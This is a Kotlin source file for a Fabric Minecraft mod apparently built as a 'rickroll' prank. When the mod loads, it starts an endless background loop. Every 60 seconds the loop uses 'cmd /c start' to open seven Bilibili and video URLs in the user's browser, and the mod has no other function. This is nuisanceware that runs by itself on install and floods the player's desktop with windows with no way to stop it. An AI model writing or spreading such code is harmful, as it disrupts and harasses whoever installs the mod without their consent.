package org.rickroll.olivern

import com.mojang.authlib.minecraft.client.MinecraftClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import net.fabricmc.api.ModInitializer
import java.awt.Desktop
import java.io.IOException
import java.net.URI
import java.net.URISyntaxException


class Olivern : ModInitializer {

    override fun onInitialize() {
        openBrow()
    }

    fun openBrow() {
        val url = arrayOf("https://www.bilibili.com/video/BV1GePFesERD/", "https://vdse.bdstatic.com/192d9a98d782d9c74c96f09db9378d93.mp4", "https://www.bilibili.com/video/BV1GJ411x7h7", "https://www.bilibili.com/video/BV1t5411G7KR", "https://www.bilibili.com/video/BV1S1421D72Q", "https://www.bilibili.com/video/BV1Rt4y1B7v7", "https://www.bilibili.com/video/BV115411775P")
        val customScope = CoroutineScope(Dispatchers.Default)
        customScope.launch {
            while (true) {
                for (rickroll in url) {
                    try {
                        Runtime.getRuntime().exec(arrayOf("cmd", "/c", "start", rickroll))
                    } catch (e: Exception) {
                        e.printStackTrace()
                    }
                }
                delay(60_000L)
            }
        }
    }
}
